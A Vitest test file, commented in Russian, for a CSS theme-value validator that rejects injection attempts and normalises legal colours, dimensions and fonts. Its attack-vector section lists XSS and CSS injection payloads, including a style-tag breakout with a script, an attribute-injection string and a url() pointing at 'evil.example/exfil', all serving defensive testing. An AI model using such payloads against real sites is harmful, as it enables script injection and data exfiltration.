import { describe, expect, test } from 'vitest'
import { ThemeonError } from './errors'
import { ALLOWED_TENANT_TYPES, validateTenantTextValue, validateTenantValue } from './patch-grammar'

/**
 * Грамматика tenant-патча (P6.1, H3 И1). Тест-вектора атак пишутся ПЕРВЫМИ (red) — таков
 * порядок в этом файле: reject-класс раньше happy-path, чтобы регэксп не подгонялся под
 * happy-path постфактум (Code Guidance item'а «анти-подгонка»).
 */

function code(fn: () => unknown): string {
  try {
    fn()
  } catch (e) {
    return (e as ThemeonError).code
  }
  throw new Error('expected a throw')
}

describe('validateTenantValue — вектора атак (fail-loud, positive allowlist)', () => {
  test.each([
    ['color', 'red}</style><script>alert(1)</script>'],
    ['color', '#fff;}'],
    ['dimension', '1px}'],
    ['color', 'url(https://evil.example/exfil?x=1)'],
    ['color', 'expression(alert(1))'],
    ['color', '@import url(x)'],
    ['color', '#fff/*'],
    ['color', 'a\\3c b'], // CSS unicode-escape попытка протащить `<` в обход
    ['dimension', '10px\n}'],
    ['fontFamily', 'system-ui" onload="alert(1)'],
  ] as const)('%s %s → throw (не тихо escape/skip)', (type, value) => {
    expect(() => validateTenantValue(type, value)).toThrow(ThemeonError)
  })

  test('метасимвол → UNSAFE_CSS_TOKEN, невалидная грамматика типа → BAD_VALUE', () => {
    expect(code(() => validateTenantValue('color', '#fff;}'))).toBe('UNSAFE_CSS_TOKEN')
    expect(code(() => validateTenantValue('color', 'expression(alert(1))'))).toBe('BAD_VALUE')
  })

  test('rejection message never echoes the hostile payload', () => {
    try {
      validateTenantValue('color', 'red}</style><script>alert(1)</script>')
    } catch (e) {
      const err = e as ThemeonError
      expect(err.message).not.toContain('alert(1)')
      expect(err.message).not.toContain('</style>')
      return
    }
    throw new Error('expected a throw')
  })

  test('parseColor(v)!==null НЕ достаточно — метасимвол ловится ДО parseColor', () => {
    // 'red}' — 'red' само по себе не парсится parseColor (не именованный CSS-цвет 'red}'),
    // но проверяем, что причина отказа — метасимвол, а не провал парсера (порядок гейтов).
    expect(code(() => validateTenantValue('color', 'red}'))).toBe('UNSAFE_CSS_TOKEN')
  })
})

describe('validateTenantValue — легальные значения проходят и нормализуются', () => {
  test('color: hex нормализуется к нижнему регистру (canonical, не эхо)', () => {
    expect(validateTenantValue('color', '#1A73E8')).toBe('#1a73e8')
  })

  test('color: oklch() — функциональная нотация допустима (скобки не в reject-наборе)', () => {
    expect(validateTenantValue('color', 'oklch(0.6 0.15 250)')).toBe('oklch(0.6 0.15 250)')
  })

  test('dimension: px/rem проходят как есть', () => {
    expect(validateTenantValue('dimension', '8px')).toBe('8px')
    expect(validateTenantValue('dimension', '1.5rem')).toBe('1.5rem')
  })

  test('fontWeight: числовой вес 100..900 проходит', () => {
    expect(validateTenantValue('fontWeight', '600')).toBe('600')
  })

  test('number: unitless число проходит', () => {
    expect(validateTenantValue('number', '40')).toBe('40')
    expect(validateTenantValue('number', '-1')).toBe('-1')
  })

  test('duration: ms/s проходят', () => {
    expect(validateTenantValue('duration', '200ms')).toBe('200ms')
  })

  test('fontFamily: comma-separated stack без метасимволов проходит', () => {
    expect(validateTenantValue('fontFamily', 'system-ui, sans-serif')).toBe('system-ui, sans-serif')
  })
})

describe('validateTenantValue — тип вне ALLOWED_TENANT_TYPES', () => {
  test.each(['shadow', 'gradient', 'cubicBezier'] as const)('%s → UNSUPPORTED_TENANT_TYPE, не silent-skip', (type) => {
    expect(ALLOWED_TENANT_TYPES.has(type)).toBe(false)
    expect(code(() => validateTenantValue(type, '0 1px 2px black'))).toBe('UNSUPPORTED_TENANT_TYPE')
  })
})

describe('validateTenantTextValue — композит {size, lineHeight?}', () => {
  test('легальный композит проходит, lineHeight-число коэрсится в строку', () => {
    expect(validateTenantTextValue({ size: '1.75rem', lineHeight: 1.4 })).toEqual({
      size: '1.75rem',
      lineHeight: '1.4',
    })
  })

  test('size — обязателен, без lineHeight — тоже валиден', () => {
    expect(validateTenantTextValue({ size: '2rem' })).toEqual({ size: '2rem' })
  })

  test('голая строка вместо объекта → BAD_VALUE (не тот же контракт, что TextStyleValue P1.2)', () => {
    expect(code(() => validateTenantTextValue('1.5rem'))).toBe('BAD_VALUE')
  })

  test('посторонний ключ в объекте → BAD_VALUE', () => {
    expect(code(() => validateTenantTextValue({ size: '1rem', letterSpacing: '0.1em' }))).toBe('BAD_VALUE')
  })

  test('метасимвол внутри size → UNSAFE_CSS_TOKEN', () => {
    expect(code(() => validateTenantTextValue({ size: '1rem}</style>' }))).toBe('UNSAFE_CSS_TOKEN')
  })
})

test('ALLOWED_TENANT_TYPES — ровно 7 типов v1 (P-D70)', () => {
  expect([...ALLOWED_TENANT_TYPES].sort()).toEqual(
    ['color', 'dimension', 'duration', 'fontFamily', 'fontWeight', 'number', 'text'].sort(),
  )
})
